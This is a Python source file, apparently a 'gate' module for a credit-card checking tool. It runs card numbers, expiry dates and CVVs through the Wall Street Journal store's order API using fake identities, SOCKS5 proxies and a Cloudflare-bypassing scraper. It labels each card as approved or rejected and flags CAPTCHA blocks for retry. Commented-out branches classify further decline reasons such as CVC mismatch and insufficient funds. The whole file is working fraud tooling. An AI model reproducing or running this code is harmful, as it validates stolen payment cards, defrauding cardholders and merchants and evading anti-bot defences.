
   
import json
import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'MasterCard'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'AmericanExpress'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'Discover'

    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]



        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40

        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False

            },
            debug=False

        )


    #datext

        #cs.proxies.update(proxies)
        try:
            status = dict()

            headers = {
                "Host": "store.wsj.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1"
            }

            datac = cs.get("https://store.wsj.com/v2/US/US/1107100005?", proxies=proxies,timeout=timeout)




            headers = {
                "Host": "store.wsj.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Length": "28",
                "Origin": "https://store.wsj.com",
                "DNT": "1",
                "Connection": "keep-alive",
                "Referer": "https://store.wsj.com/v2/US/US/1107100005?",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
            email = self.billx.emailx.lower()
            emailx = "email="+email+"@hotmail.com"
            datac = cs.post("https://store.wsj.com/vir/email/exists", headers=headers, data=emailx, proxies=proxies,timeout=timeout)
            
            validBlock = False
            if "Please verify you are a human" in datac.text:
                validBlock = True
            else:
                headers = {
                    "Host": "store.wsj.com",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://store.wsj.com",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Referer": "https://store.wsj.com/v2/US/US/1107100005?",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Content-Length": "0",
                    "TE": "trailers"
                }

                datac = cs.post("https://store.wsj.com/vir/payment/session/id",headers=headers, proxies=proxies,timeout=timeout)
                
                paymentSessionId = datac.json()['paymentSessionId']

                headers = {
                    "Host": "store.wsj.com",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "1312",
                    "Origin": "https://store.wsj.com",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Referer": "https://store.wsj.com/v2/US/US/1107100005?",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "TE": "trailers"
                }

                data = {"lineItems":[{"offer":{"id":"1107100005","version":"1107100005","sku":"sku1005410019","currencyCode":"USD","countryCode":"US","edition":"US","studentOffer":"false","professorOffer":"false"}}],"identity":{"firstName":self.billx.nameFirs,"lastName":self.billx.nameLast,"emailAddress":emailx,"securityQuestion":"","securityQuestionId":"","securityAnswer":"","countryOfResidence":"US","currencyCode":"USD","countryCode":"US","phoneNumber":"","languagePreference":"en_US","password":"TWFkZXJhNzUz"},"trackingCode":"aaqwzsb7","meta":{},"paymentMethod":{"type":"creditCard","paymentMethod":{"method":"creditCard","payment":{"nameOnCard":f'{self.billx.nameFirs} {self.billx.nameLast}',"cardNumber":cc.ccnum,"expirationMonth":cc.expm,"expirationYear":cc.expy,"securityCode":cc.cv2}},"billingContact":{"profile":{"firstName":self.billx.nameFirs,"lastName":self.billx.nameLast},"address":{"addressLines":[],"city":"Miami","country":"US","state":"FL","postalCode":"33126","streetName":"Northwest 7th Street","streetNumber":"6703"}},"paymentSessionId":paymentSessionId},"addressData":{"rawAddress":{"country":"US","addressLine1":"6703 Northwest 7th Street","addressLine2":"","city":"Miami","state":"FL","zipCode":"33126","phone":""},"googleMapSearch":"6703 Northwest 7th Street, Miami, FL, USA","googleSearchValue":""},"suppressEmailOptins":"true","paymentSectionRequiredFlag":"true"}

                datac = cs.post("https://store.wsj.com/vir/api/orders",headers=headers,json=data, proxies=proxies,timeout=timeout)


            if 'statusCode":201' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED""",'proxy':dataGate.proxy,'datext':None}
            elif 'statusCode":202' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED""",'proxy':dataGate.proxy,'datext':None}
            elif 'cause' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED""",'proxy':dataGate.proxy,'datext':None}
            elif '"blockScript":"/HsY3fa0I/captcha/captcha.js?a' in datac.text:
                return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
            
            elif validBlock:
                return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
            #if 'incorrect_zip' in datac.text or 'Your card zip code is incorrect.' in datac.text or 'The zip code you supplied failed validation' in datac.text or 'card zip code is incorrect' in datac.text:
                #status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: CVV LIVE [ZIP INCORRECT]""",'proxy':dataGate.proxy,'datext':None}

            #elif  'Thank You For Your Payment.' in datac.text or '"cvc_check": "pass"' in datac.text or 'thank_you' in datac.text or '"type":"one-time"' in datac.text or '"state": "succeeded"' in datac.text or "Your payment has already been processed" in datac.text or '"status": "succeeded"' in datac.text : #or 'donation_number=' in res.text
                #status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED [CVV MATCH]""",'proxy':dataGate.proxy,'datext':None}
            #elif "card has insufficient funds" in datac.text or 'insufficient_funds' in datac.text or 'Insufficient Funds' in datac.text :

                #status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED [LOW BALANCE]""",'proxy':dataGate.proxy,'datext':None}
            #elif "card's security code is incorrect" in datac.text or "card&#039;s security code is incorrect" in datac.text or "security code is invalid" in datac.text or 'CVC was incorrect' in datac.text or "incorrect CVC" in datac.text or 'cvc was incorrect' in datac.text or 'Card Issuer Declined CVV' in datac.text :
                #text = f"""{dataGate.cc} |- RESULT: APPROVED [CVC MISMATCH]"""
                #status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED [CVC MISMATCH]""",'proxy':dataGate.proxy,'datext':None}
            #elif "card does not support this type of purchase" in datac.text or 'transaction_not_allowed' in datac.text or 'Transaction Not Allowed' in datac.text:


                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED [PURCHASE NOT ALLOWED]""",   'proxy':dataGate.proxy,'datext':None}
            #elif "card number is incorrect" in datac.text or 'incorrect_number' in datac.text or 'Invalid Credit Card Number' in datac.text or 'card number is incorrect' in datac.text:
                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [CARD INCORRECT]""",   'proxy':dataGate.proxy,'datext':None}
            #elif "Customer authentication is required" in datac.text or "unable to authenticate" in datac.text or "three_d_secure_redirect" in datac.text or "hooks.stripe.com/redirect/" in datac.text or 'requires an authorization' in datac.text:
                #text = f"""{dataGate.cc} |- RESULT: REJECTED [3D SECURITY]"""
                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [3D SECURITY]""",   'proxy':dataGate.proxy,'datext':None}
            #elif "card was declined" in datac.text or 'card_declined' in datac.text or 'The transaction has been declined' in datac.text or 'Processor Declined' in datac.text:
                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [NO NOT HONOR]""",   'proxy':dataGate.proxy,'datext':None}

            #elif 'Do Not Honor' in datac.text :
                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [NO NOT HONOR]""",   'proxy':dataGate.proxy,'datext':None}
            #elif "card has expired" in datac.text or 'Expired Card' in datac.text:
                #status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [CARD EXPIRED]""",   'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':None}


            return status
        except Exception as e:
            #print(e,'que pasox')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
